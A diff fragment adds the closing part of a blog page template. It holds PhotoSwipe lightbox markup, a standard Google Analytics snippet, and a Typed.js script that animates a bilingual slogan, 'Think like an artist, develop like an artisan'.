+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+ 
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="//www.googletagmanager.com/gtag/js?id=UA-149874671-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag() {
+    dataLayer.push(arguments);
+  }
+  gtag('js', new Date());
+
+  gtag('config', 'UA-149874671-1');
+</script>
+ 
+
+<script>
+  function initialTyped() {
+    var typedTextEl = $('.typed-text');
+    if (typedTextEl && typedTextEl.length > 0) {
+      var typed = new Typed('.typed-text', {
+        strings: ['Think like an artist, develop like an artisan', '艺术家思维去思考问题，工匠创造精神去开发'],
+        typeSpeed: 90,
+        loop: true,
+        loopCount: Infinity,
+        backSpeed: 20,
+      });
+    }
+  }
+
+  if ($('.article-header') && $('.article-header').length) {
+    $(document).ready(function () {
+      initialTyped();
+    });
+  }
+</script>
+
+
+
+
+</html>
